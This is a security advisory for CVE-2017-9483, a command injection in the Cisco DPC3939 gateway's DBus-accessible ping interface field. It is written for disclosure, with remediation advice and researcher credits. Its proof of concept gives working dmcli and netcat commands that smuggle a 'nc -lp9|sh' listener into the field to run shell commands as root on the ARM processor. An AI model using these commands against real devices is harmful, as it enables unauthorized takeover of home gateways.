@@ -1,0 +1,55 @@
+Bastille Tracking Number 26
+CVE-2017-9483
+
+Overview
+
+A vulnerability has been discovered that enables an attacker to execute arbitrary commands on the application processor (ARM) Linux instance on a gateway.
+
+
+
+Affected Platforms
+
+Cisco DPC3939, firmware version dpc3939-P20-18-v303r20421746-170221a-CMCST
+
+
+
+Proof-of-Concept
+
+Once an attacker has gained Telnet root on the network processor (Atom) Linux instance on a gateway (Bastille Tracking Number 25), it is possible to execute arbitrary commands on the application processor (ARM) Linux instance.
+
+The most recent firmware fixed a web UI command injection vulnerability affecting the ping command, however a DBus accessible version of the vulnerability remains.
+
+When the gateway executes a ping command, it does so by calling the ping binary on the AP CPU. It is possible to inject up to 13 characters of shell commands into the interface field of the ping command, which then get executed on the AP CPU.
+
+Executing the following three commands will first create a netcat listener on the AP CPU, and then inject the command "touch /tmp/test": 
+
+dmcli eRT setv Device.IP.Diagnostics.IPPing.Interface string "\`nc -lp9|sh\`"
+dmcli eRT setv Device.IP.Diagnostics.IPPing.DiagnosticsState string Requested
+echo "touch /tmp/test" | nc 10.0.0.1 9
+
+This technique can be used to gain a root shell on the AP CPU by disabling the firewall and starting a new Dropbear instance.
+
+
+
+Test Environment
+
+Cisco DPC3939, firmware version dpc3939-P20-18-v303r20421746-170221a-CMCST
+
+
+
+Mitigation
+
+There is no apparent mechanism to allow Comcast customers to prevent access to the NP internal IP address or control the Telnet server.
+
+
+
+Recommended Remediation
+
+Update the firewall rules to prevent access to the NP internal IP address from the LAN, and add input validation to the interface field.
+
+
+
+Credits
+
+Marc Newlin and Logan Lamb, Bastille
+Chris Grayson, Web Sight.IO
